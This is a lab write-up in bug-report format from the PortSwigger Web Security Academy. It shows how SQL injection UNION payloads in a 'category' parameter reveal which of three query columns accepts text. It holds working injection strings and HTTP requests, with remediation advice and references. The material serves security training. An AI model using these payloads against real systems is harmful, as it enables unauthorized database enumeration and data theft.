
---
# SQL Injection UNION Attack in Product Filter allows Identification of a Text-Compatible Column

## 1. Executive Summary

A SQL injection vulnerability exists in the product category filtering functionality, allowing an attacker to inject a `UNION SELECT` statement through the `category` parameter. After determining that the original query returns three columns, an attacker can replace each `NULL` value with a known string to identify which column accepts text data, enabling further `UNION`-based SQL injection attacks.

## 2. Vulnerability Details

- **Vulnerability Type:** SQL Injection — UNION-based Column Type Enumeration
    
- **Target Endpoint/URL:** `/filter`
    
- **Affected Parameter(s):** `category`
    
- **Authentication Level Required:** Unauthenticated
    

The application incorporates the user-controlled `category` parameter into a SQL query without using parameterized queries.

A successful `UNION SELECT` attack requires:

1. The injected query to return the same number of columns as the original query.
    
2. The injected values to have compatible data types with the corresponding columns.
    

In this lab, the original query returns **three columns**. The goal is to determine which of these columns can contain text.

## 3. Steps to Reproduce (STR)

### Step 1 — Confirm the number of columns

1. Access the PortSwigger lab.
    
2. Navigate to the product listing page.
    
3. Select a product category.
    
4. Intercept the request using Burp Suite.
    
5. Locate the `category` parameter.
    
6. Modify the parameter to:
    

```
'+UNION+SELECT+NULL,NULL,NULL--
```

7. Forward the request.
    
8. Observe that the request succeeds.
    
9. This confirms that the original query returns **three columns**.
    

### Step 2 — Test the first column for text compatibility

10. Replace the first `NULL` with the random string provided by the lab.
    

For example:

```
'+UNION+SELECT+'abcdef',NULL,NULL--
```

11. Forward the request.
    
12. If an error occurs, the first column is not compatible with the supplied text value.
    
13. Move to the second column.
    

### Step 3 — Test the second column

14. Replace the second `NULL` with the random string:
    

```
'+UNION+SELECT+NULL,'abcdef',NULL--
```

15. Forward the request.
    
16. If an error occurs, move to the third column.
    

### Step 4 — Test the third column

17. Replace the third `NULL` with the random string:
    

```
'+UNION+SELECT+NULL,NULL,'abcdef'--
```

18. Forward the request.
    
19. If the response succeeds and the random string appears in the response, the third column accepts text data.
    
20. The successful payload identifies the column that can be used to retrieve text-based information in subsequent SQL injection attacks.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

#### Confirm three columns

```
GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

The successful request demonstrates that the original query returns three columns.

#### Test column 1

```
GET /filter?category='+UNION+SELECT+'abcdef',NULL,NULL-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

If an error occurs, column 1 is not compatible with the supplied text value.

#### Test column 2

```
GET /filter?category='+UNION+SELECT+NULL,'abcdef',NULL-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

If this also produces an error, test the final column.

#### Test column 3

```
GET /filter?category='+UNION+SELECT+NULL,NULL,'abcdef'-- HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

A successful response containing:

```
abcdef
```

confirms that the **third column accepts text data**.

Conceptually, the successful query is:

```
SELECT ...
UNION
SELECT NULL, NULL, 'abcdef'
--';
```

This information can then be used to construct subsequent payloads that retrieve text data from the database.

### Evidence (Screenshots/Video)



## 5. Impact Analysis

- **Technical Impact:** An attacker can identify which column in the vulnerable SQL query accepts text data. This enables the construction of further `UNION SELECT` payloads that retrieve text-based information such as usernames, database names, table names, or other sensitive values.
    
- **Business Impact:** Column-type enumeration is primarily an intermediate exploitation step. When combined with SQL injection, it can facilitate unauthorized database enumeration and sensitive data extraction.
    

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements so that user-controlled input cannot alter the structure of the SQL query.
    

For example:

```
cursor.execute(
    "SELECT * FROM products WHERE category = %s",
    (category,)
)
```

Additional defenses include:

- Use prepared statements/parameterized queries.
    
- Never concatenate user-controlled input into SQL queries.
    
- Apply least-privilege permissions to the database account.
    
- Avoid exposing detailed database errors to users.
    
- Implement appropriate server-side input validation as defense in depth.
    

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection Prevention Cheat Sheet
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - PortSwigger Web Security Academy — SQL Injection UNION Attacks